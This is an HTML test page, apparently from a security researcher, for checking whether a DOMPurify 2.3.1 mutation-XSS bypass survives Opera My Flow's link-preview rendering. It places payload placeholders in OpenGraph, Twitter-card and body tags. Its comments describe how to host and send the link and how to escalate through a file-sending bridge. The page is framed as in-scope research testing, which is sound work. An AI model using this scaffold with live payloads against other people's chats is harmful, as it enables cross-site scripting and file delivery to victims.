
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<!-- =========================================================================
     Opera My Flow — link-unfurl XSS test page (BENIGN).
     When this URL is shared in a My Flow chat, Opera fetches it and builds a
     rich "preview" (record.previewHtml / rich description) from the meta tags
     and page HTML below, then renders it via:
         .preview'.innerHTML = Sanitizer.escapeHTML`${record.previewHtml}`   // DOMPurify 2.3.1
     Goal: see whether a DOMPurify-2.3.1 pure-HTML mXSS bypass survives into
     the flow.opera.com/ext/v1 origin.

     HOW TO USE:
       1. Run dompurify_231_harness.html first. Copy the ONE vector that shows
          FIRED (its raw payload), e.g. the style-a-id / noscript-attr string.
       2. Replace every __PAYLOAD__ below with that winning payload.
          For the LIVE confirm, make its handler do alert(document.domain)
          (benign origin proof) — e.g.  onerror=alert(document.domain)
       3. Host this file over HTTPS (your own GitHub Pages, e.g.
          https://umar1105.github.io/mf_unfurl.html).
       4. In YOUR OWN paired My Flow chat, send that link. Watch flow.opera.com.
       5. If it fires: escalate on the SAME origin with a BENIGN bridge call
          (see the SEND_FILE/OPEN_FILE snippet in the notes) — write marker.txt,
          never an executable. Keep everything on your own devices, in scope.
     ========================================================================= -->

<!-- OpenGraph: common source of unfurl title/description -->
<meta property="og:title"       content="__PAYLOAD__">
<meta property="og:description" content="__PAYLOAD__">
<meta property="og:site_name"   content="My Flow unfurl test">
<meta property="og:image"       content="https://umar1105.github.io/pixel.png">

<!-- Rich / oEmbed-style tags that commonly become an embedded "previewHtml" iframe -->
<meta property="og:type"        content="video.other">
<meta property="og:video"       content="__PAYLOAD__">
<meta name="twitter:card"       content="player">
<meta name="twitter:title"      content="__PAYLOAD__">
<meta name="twitter:player"     content="__PAYLOAD__">
<link rel="alternate" type="application/json+oembed" href="https://intanjelek.github.io/mf_oembed.json">

<title>My Flow unfurl test</title>
</head>
<body>
  <h1>__PAYLOAD__</h1>
  <p>Benign My Flow unfurl test page. The rich preview is built from the meta tags above.</p>

  <!-- Some unfurlers extract the first rich/article HTML block. Mirror the payload
       in-body too, in case previewHtml derives from page content, not just meta. -->
  <article>__PAYLOAD__</article>
</body>
</html>
